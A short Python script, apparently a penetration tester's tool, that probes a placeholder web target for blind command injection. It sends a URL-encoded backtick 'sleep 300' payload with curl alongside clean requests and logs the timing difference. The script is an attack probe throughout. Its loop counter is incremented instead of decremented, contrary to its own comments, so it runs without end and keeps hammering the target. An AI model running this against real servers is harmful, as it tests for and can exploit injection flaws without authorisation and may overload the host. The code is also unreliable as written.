#!/usr/bin/python3
import time,os

# command injection test 
#  - curl to send and time the request 
#  - injecting sleep command
#

url ="https://www.target.tld/"
payload="%60sleep%20300%60"
delay=6 # the delay could be very sens ..
requests = 50 # 2 for each loop;50 will send 100 requests

while requests >= 0:
    os.system("curl -w '@curl.timeformat.txt' -o /dev/null -s " +url+payload+ " | tee -a inject.sleep.out") 
    time.sleep(delay)
    os.system("curl  -w '@curl.timeformat.txt' -o /dev/null -s "+ url + " | tee -a inject.nosleep.out")
    # give the server time to recover to reduce false positve
    time.sleep(delay)
    requests+=1
#
# cat curl.timeformat.txt 
#      time_namelookup:  %{time_namelookup}s\n
#         time_connect:  %{time_connect}s\n
#      time_appconnect:  %{time_appconnect}s\n
#     time_pretransfer:  %{time_pretransfer}s\n
#        time_redirect:  %{time_redirect}s\n
#   time_starttransfer:  %{time_starttransfer}s\n
#                        ----------\n
#           time_total:  %{time_total}s\n
